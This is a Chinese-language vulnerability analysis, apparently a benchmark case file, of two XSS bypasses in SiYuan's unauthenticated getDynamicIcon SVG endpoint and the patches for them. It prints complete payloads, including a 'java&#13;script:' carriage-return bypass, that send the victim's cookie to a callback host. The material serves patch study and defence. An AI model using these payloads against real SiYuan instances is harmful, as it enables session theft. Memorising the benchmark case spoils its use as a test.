# SiYuan：SanitizeSVG 只认字面 `javascript:`，中间夹进 CR 就漏过

- Case：`PCBV2-0194`
- 产品：SiYuan（思源笔记，Go kernel + 官方镜像 `b3log/siyuan`）。运行时是整进程 HTTP，不是抽出来的函数。本 case 属 L3/restricted，下文只对着补丁和 V1 源码写，不 docker-build。
- 链：CVE-2026-29183（3.5.8 → 3.5.9，`RemoveScriptsInSVG` → `SanitizeSVG`）→ CVE-2026-31809（3.5.9 → 3.5.10，GHSA-pmc9-f5qr-2pcr）
- 源码对着 tag `v3.5.9` 的 `kernel/api/icon.go`（`getDynamicIcon` / `generateTypeEightSVG`）、`kernel/util/misc.go`（`SanitizeSVG`）。金丝雀是 victim 种在 SiYuan origin 上的 cookie，XSS 点一下链出去。

NVD / GHSA-pmc9-f5qr-2pcr 的原话：*This is a second bypass of the fix for CVE-2026-29183 (fixed in v3.5.9)*。更具体：*`SanitizeSVG` checks href attributes for the `javascript:` prefix using `strings.HasPrefix()`. However, inserting ASCII tab / newline / carriage return inside the `javascript:` string bypasses this prefix check. Browsers strip these characters per the WHATWG URL specification.*

根因不只是「正则写窄了」。检查插在「属性值字符串是不是以 `javascript:` 开头」上；真正让脚本跑起来的是浏览器按 WHATWG 解析 `href` 之后的点击。同文件里已经有 `EscapeHTML`，事件属性也已经整段丢掉，却没有在 `HasPrefix` 之前按 URL 规范清掉 C0 空白。下面按请求走进去。

---

## 这块功能本来在干什么

SiYuan 给笔记提供动态图标。`type=8` 是「文字图标」：调用方把一段 `content` 塞进 SVG 的 `<text>`，接口直接回 `image/svg+xml`。路由挂在未鉴权段。一次典型请求：

```http
GET /api/icon/getDynamicIcon?type=8&color=blue&content=Hello
```

`kernel/api/icon.go` 的 `getDynamicIcon` 取出 query，走到 `generateTypeEightSVG`。`content` **不做 XML/HTML 转义**，用 `fmt.Sprintf` 嵌进 SVG 模板：

```go
// kernel/api/icon.go :: generateTypeEightSVG  (siyuan v3.5.9)
func generateTypeEightSVG(color, content, id string) string {
  if strings.Contains(content, ".action{") {
    content = model.RenderDynamicIconContentTemplate(content, id)
  }
  colorScheme := getColorScheme(color)
  // ... 按汉字/字母个数算 fontSize、dy ...
  return fmt.Sprintf(`<svg ...><text ...>%s</text></svg>`,
    colorScheme.Primary, dy, fontSize, content)
}
```

拼完之后，若 `Conf.Editor.AllowSVGScript` 为假（默认），才交给消毒器，再原样写出：

```go
// kernel/api/icon.go :: getDynamicIcon  (v3.5.9)
  if !model.Conf.Editor.AllowSVGScript {
    svg = util.SanitizeSVG(svg)
  }
  c.Header("Content-Type", "image/svg+xml")
  c.String(http.StatusOK, svg)
```

设计意图：`content` 是图标上的几个字（「周」「Mon」），落在 `<text>` 里，不能变成可执行节点。成功穿越之后的效果是：**响应里留下可点击的 `javascript:` 链，浏览器在 SiYuan origin 上执行，把 victim cookie 送到 callback**。

数据流：

```text
GET /api/icon/getDynamicIcon?type=8&content=</text><a href="…">…
    → getDynamicIcon
         generateTypeEightSVG(content)     ← 用户字符串原样进 SVG
         SanitizeSVG(svg)                  ← V1 谓词插在这里
              html.Parse  （实体先解码）
              HasPrefix(val, "javascript:")
              html.Render  （属性写回响应）
    → Content-Type: image/svg+xml
    → 浏览器按 WHATWG 解析 href，点击执行
    → document.cookie → callback → PCBFLAG_...
```

没有登录。`type=8` 的 `content` 几乎没有字符白名单。

---

## 原始漏洞：只剥 `<script>`（CVE-2026-29183，3.5.8）

3.5.8 的消毒器叫 `RemoveScriptsInSVG`。GHSA-6865-qjcf-286f 写明：*sanitizer only removes `<script>` tags*，不处理 `onerror` / `onload`，也不处理 `<a href="javascript:…">`。`generateTypeEightSVG` 用 `%s` 把 `content` 嵌进 `<text>`，攻击者先闭合 `</text>`，再插入自己的元素。

本 case seed 用的是反射型 `<a href="javascript:…">`（和 advisory 里的 `onerror` 是同一入口、同一 sink，只是载荷形态不同）：

```text
content = </text><a href="javascript:location='http://callback:9000/c?f='+document.cookie"><text …>c</text></a><text>
```

3.5.8 剥掉 `<script>` 之后，`<a href="javascript:…">` 还在。响应 `Content-Type` 是 `image/svg+xml`，浏览器当 SVG 文档打开；victim 点一下文字，`javascript:` URL 在 SiYuan origin 跑，cookie 里的 `PCBFLAG_...` 出现在 callback。这就是 v0 + `--seed` 观察到 flag。

NVD 对 CVE-2026-29183 的摘要也点了同一条未鉴权接口：*`GET /api/icon/getDynamicIcon` when `type=8`, attacker-controlled content is embedded into SVG output without escaping*。

---

## 维护者改了什么（CVE-2026-29183 修复，3.5.9）

3.5.9 把 `RemoveScriptsInSVG` 换成 `SanitizeSVG`。V1 源码在 `kernel/util/misc.go`，对着 tag `v3.5.9`：

```go
// kernel/util/misc.go :: SanitizeSVG  (siyuan v3.5.9)
func SanitizeSVG(svgInput string) string {
  doc, err := html.Parse(strings.NewReader(svgInput))
  // ...
  var walk func(*html.Node)
  walk = func(n *html.Node) {
    for c := n.FirstChild; c != nil; {
      next := c.NextSibling
      if c.Type == html.ElementNode {
        tag := strings.ToLower(c.Data)
        if tag == "script" || tag == "iframe" || tag == "object" ||
           tag == "embed" || tag == "foreignobject" {
          n.RemoveChild(c)
          c = next
          continue
        }
        filtered := c.Attr[:0]
        for _, a := range c.Attr {
          key := strings.ToLower(a.Key)
          val := strings.TrimSpace(strings.ToLower(a.Val))

          if strings.HasPrefix(key, "on") {
            continue
          }
          if key == "href" || key == "xlink:href" || key == "xlinkhref" {
            if strings.HasPrefix(val, "javascript:") {
              continue
            }
            if strings.HasPrefix(val, "data:") {
              if strings.Contains(val, "text/html") ||
                 strings.Contains(val, "image/svg+xml") ||
                 strings.Contains(val, "application/xhtml+xml") {
                continue
              }
            }
          }
          filtered = append(filtered, a)
        }
        c.Attr = filtered
      }
      if c.Parent != nil {
        walk(c)
      }
      c = next
    }
  }
  walk(doc)
  // html.Render → extractSVG
}
```

V1 谓词的字面意思：

| 步骤 | 含义 |
|---|---|
| `html.Parse` | 先把 `&#13;` / `&#9;` / `&#10;` 解成真实 CR/TAB/LF |
| `ToLower` + `TrimSpace` | 只削两端空白，**中间的 C0 留下** |
| `HasPrefix(val, "javascript:")` | 看解码后的字符串是不是以这 11 个字符开头 |
| `html.Render` | 把还在的属性写回响应；中间的 CR 会按实体或字面再出去 |

对 seed 这种明文 `javascript:`，它确实够用：`HasPrefix` 为真，整条 `href` 丢掉，SVG 里没有可执行链，victim 点不到 callback。这就是 v1 + `--seed` 退出码 10。

补丁默认了两件事：

1. 危险 scheme 长得像字面 `javascript:`（小写、中间没有别的字符）。
2. `html.Parse` 解完实体之后，剩下的字节和浏览器最终拿去解析 URL 的字节是同一套。

第二点不成立。更关键的是：这一行之后，代码仍然把**没删掉的** `href` 原样 `Render` 进 `image/svg+xml`，浏览器会按 WHATWG 再解析一遍，中间没有第二次谓词。

---

## 消毒之后，属性怎么接到浏览器上

`HasPrefix` 一结束，同一个 `walk` 把 `filtered` 写回 `c.Attr`。函数末尾 `html.Render` 把整棵树序列化，`extractSVG` 切出 `<svg>…</svg>`，`getDynamicIcon` 用 `c.String(200, svg)` 发出去。

`html.Parse` 和浏览器不是同一套 URL 语义：

- Go 的 `golang.org/x/net/html`（SiYuan 用的是 `github.com/88250/lute/html`，行为同类）：属性值里的 `&#13;` 变成 U+000D，留在字符串中间。
- `strings.TrimSpace` 只认两端。`HasPrefix("java\rscript:…", "javascript:")` 为假。
- `html.Render` 把 U+000D 再写成 `&#13;`（或等价形式）放回 `href`。
- 浏览器按 WHATWG URL Standard 第 1 步：输入里的 U+0009 / U+000A / U+000D **全部删除**，然后再看 scheme。`java\rscript:` 变成 `javascript:`。

过滤器刚看过的是「当前这个 Go 字符串的前缀」；消费者看到的是「序列化后再经 WHATWG 剥 C0 的 URL」。两套语义中间没有第二次谓词。

victim 流程：headless Chromium 带着 SiYuan origin 的 cookie 打开这张 SVG，点 `<a>`，`javascript:` 跑起来，`document.cookie` 进 callback。金丝雀能出现在 `/dump` 里，依据就是这一步，而不是「SVG 里碰巧有个同名文本节点」。

---

## 仓库里已经有更强的检查，href 没用

同一份 `kernel/util/misc.go` 里已经有 HTML 转义：

```go
// kernel/util/misc.go :: EscapeHTML  (v3.5.9)
func EscapeHTML(s string) (ret string) {
  ret = html.EscapeString(ret)
  return
}
```

谁调用它：

| 位置 | 调用 `EscapeHTML`？ |
|---|---|
| 若干 UI / 提示字符串 | 是 |
| `generateTypeEightSVG` 的 `content` | **否**，`fmt.Sprintf("%s", content)` |

V1 等于在调用方拼完 SVG 之后，又做了一个**更弱**的 scheme 前缀判断（只认字面 `javascript:`），而入口那层「先转义再嵌入」始终没挂上。不是仓库里没有更好的谓词，是 **type=8 的拼接没用**。

即便没有 `&#13;` 这种实体，只要 `content` 继续裸进 `<text>`，任何让 `HasPrefix` 看走眼、但浏览器仍当成 `javascript:` 的写法（TAB、LF、前后空白以外的 C0、混合大小写之外的兼容）都会变成一次真实执行。V1 已经丢掉了 `on*` 事件属性，说明维护者知道「属性值本身可以是执行面」；他们却只对 `href` 做了前缀字符串比较，没有按 URL 规范先清洗。

`strings.Map` 删掉 `\t` `\n` `\r` 是 Go 标准库一行能写完的事，V2 也正是这么补的。V1 只是没写。

---

## 这个补丁挡住了什么、没挡住什么

到这里可以把「过滤器 vs 浏览器」落到具体代码：

- `SanitizeSVG` 的 `HasPrefix(val, "javascript:")`：看解码后的 Go 字符串前缀
- 浏览器的 URL parser：看序列化后再剥 C0 的 scheme

只要构造一种输入，使「`html.Parse` 之后的字符串」**不以** `javascript:` 开头，但「WHATWG 剥掉 TAB/LF/CR 之后」**就是** `javascript:`，第一行会放行，第二行仍然执行。

`java&#13;script:` 就是这样来的。十一个字符中间插进一个 `&#13;`：

```text
输入实体:   java&#13;script:location='http://callback:9000/c?f='+document.cookie
html.Parse: java\rscript:location=…
TrimSpace:  两端无空白，中间 CR 留下
HasPrefix:  "java\rscript:" 不是 "javascript:"  → 保留 href
html.Render: href="java&#13;script:…"
浏览器:     删 U+000D → javascript:location=…
```

GHSA-pmc9-f5qr-2pcr 给了四条向量：`&#9;`（TAB）、`&#10;`（LF）、`&#13;`（CR）、以及把空白拆进 `j a v a s c r i p t` 每个字母之间。本 case residual 用的是 CR，和 advisory Vector 3 同一构造。

带上 `generateTypeEightSVG` 的模板：

```text
content:  </text><a href="java&#13;script:location='http://callback:9000/c?f='+document.cookie"><text …>c</text></a><text>

SanitizeSVG 之后 href 仍在
响应 Content-Type: image/svg+xml
victim 点击 → callback 出现 PCBFLAG_...
```

这正是 3.5.8 上 seed 用过的那种执行面。过滤器认为自己已经把 `javascript:` 清干净了，实际上它刚放过一条浏览器会还原成 `javascript:` 的属性，并且 `c.String` 会按 SVG 文档发出去。

---

## 残余仍然走同一条 getDynamicIcon 读 SVG 路径（CVE-2026-31809）

没有换接口、没有换 `type`、没有换身份。还是：

```http
GET /api/icon/getDynamicIcon?type=8&color=blue&content=</text><a href="java&#13;script:location='http://callback:9000/c?f='+document.cookie"><text …>c</text></a><text>
```

`generateTypeEightSVG` 仍然把 `content` 嵌进 SVG。V1 那一行 `HasPrefix` 照样执行；执行完之后 `href` 还在；`html.Render` 写出带 CR 的属性；浏览器剥掉 CR 当 `javascript:` 跑；cookie 进 callback。

公开 advisory 的 residual 和本 case 构造同一 sink。认证语义：v1 + residual 应观察到 `PCBFLAG_...`。SiYuan 在本平台是 L3/restricted，文章不依赖一次本地 certify 跑数。

所以残余不是新洞面，而是同一 sink 上三件事叠在一起：前缀匹配语言比 URL 语义窄；序列化发生在检查之后；入口拼接没有使用已经存在的 `EscapeHTML`。seed 被挡住只说明「字面 `javascript:` 没了」，不说明「不能再从 getDynamicIcon 跑脚本」。

GHSA 还写了一句 *distinct from the element bypass*：3.5.10 同时拦了 `animate` / `set` 元素。那是另一条元素面；本 case 的 residual 走的是 scheme 编码面，不要和元素面混成一次「换了 sink」。

---

## 后来又补了什么（CVE-2026-31809，3.5.10）

3.5.10 在 `ToLower`/`TrimSpace` 之后、`HasPrefix` 之前，按 rune 删掉 TAB/LF/CR；并顺手把 `animate*` / `set` 加进删除名单，给 `values`/`from`/`to` 也做了 `javascript:` 子串检查（construction `patch.diff` 对着 v3.5.9 → v3.5.10）：

```go
val = strings.TrimSpace(strings.ToLower(a.Val))
val = strings.Map(func(r rune) rune {
  if r == '\t' || r == '\n' || r == '\r' {
    return -1
  }
  return r
}, val)

if strings.HasPrefix(val, "javascript:") {
  continue
}
```

对残余输入：

```text
输入:  java&#13;script:…
Parse: java\rscript:…
Map:   javascript:…
HasPrefix: 真 → 丢掉 href
```

浏览器再也拿不到可执行 scheme。公开建议是升级到 v3.5.10。

即便如此，这仍然是「在字符串上删 C0 再比前缀」，`generateTypeEightSVG` 还是不做 `EscapeHTML`。对 `&#9;` / `&#10;` / `&#13;` 这条已知链它够用；若还有其它让 scheme 在清洗之后重新出现、或根本不以 `javascript` 这几个 ASCII 字符出现的写法（例如 `data:` 里再套 SVG），需要另证。本 benchmark 的 v2 只关闭这一条 reference residual。

---

## 从这条链还能看出什么

这些不是分类标签，只是顺着代码继续看时比较自然的问题。

**维护者改错了哪一层。**  
他们改的是 `SanitizeSVG` 里 `href` 的前缀。真正执行的是浏览器对响应属性的 URL 解析。V2 仍在同一层加码（先删 C0），没有把 `content` 接到已有的 `EscapeHTML`，也没有在写出之前用 URL parser 看 scheme。

**不是没有更好的谓词。**  
`EscapeHTML` 禁止 `<` `&` 进文本节点，比 V1 那行 `HasPrefix` 更接近「用户字符串不能变成元素」。它已经用在别处。type=8 穿越走的是裸 `fmt.Sprintf`。从 V1 的 diff 只能看到换了个消毒器；要判断补丁是否闭合，必须看到 `html.Parse` 的实体解码和浏览器的 C0 删除。

**同一函数、同一 `content`，只换了 scheme 的写法。**  
任何把用户字符串传进 `generateTypeEightSVG` 的请求，在 3.5.9 上都吃这一行 `HasPrefix` 和同一次 `html.Render`。advisory 已指出 TAB/LF/CR 同样能打。

**文字图标几乎没有字符白名单。**  
`content` 按 rune 数算字号，斜杠、尖括号、实体都会留下。若只允许 `[A-Za-z0-9_]`，后面那行 `HasPrefix` 根本不会被逼去近似 URL 安全。

**金丝雀在 cookie 里是有意的。**  
flag 不在 SVG 文本里。能出现在 callback，说明跑起来的是 SiYuan origin 上的 `javascript:`，不是「图标上碰巧写了这段字」。

---

## 版本、入口、参考

| | tag | `SanitizeSVG` / 前身 | `generateTypeEightSVG` | 明文 `javascript:` seed | `java&#13;script:` residual |
|---|---|---|---|---|---|
| V0 | v3.5.8 | `RemoveScriptsInSVG` 只剥 `<script>` | 裸拼 `content` | cookie 进 callback | （不必） |
| V1 | v3.5.9 | `HasPrefix(val, "javascript:")` | 同上 | href 被删 | 浏览器还原 scheme，进 callback |
| V2 | v3.5.10 | 先 `Map` 掉 CR/LF/TAB 再 `HasPrefix` | 同上 | 挡 | 变成字面 `javascript:`，挡 |

- Web：`GET /api/icon/getDynamicIcon?type=8&content=...`（未鉴权，`image/svg+xml`）
- 本平台 SiYuan 为 L3/restricted，不在这里做 certify；语义上 v0 seed 观察到 flag，v1 seed 未观察到，v1 residual 观察到。
- [CVE-2026-29183](https://nvd.nist.gov/vuln/detail/CVE-2026-29183)、[GHSA-6865-qjcf-286f](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-6865-qjcf-286f)
- [CVE-2026-31809](https://nvd.nist.gov/vuln/detail/CVE-2026-31809)、[GHSA-pmc9-f5qr-2pcr](https://github.com/siyuan-note/siyuan/security/advisories/GHSA-pmc9-f5qr-2pcr)
- V1 blob：[`kernel/util/misc.go` @ v3.5.9](https://github.com/siyuan-note/siyuan/blob/v3.5.9/kernel/util/misc.go)、[`kernel/api/icon.go` @ v3.5.9](https://github.com/siyuan-note/siyuan/blob/v3.5.9/kernel/api/icon.go)
- V2 对照：tag `v3.5.10` 同一对文件
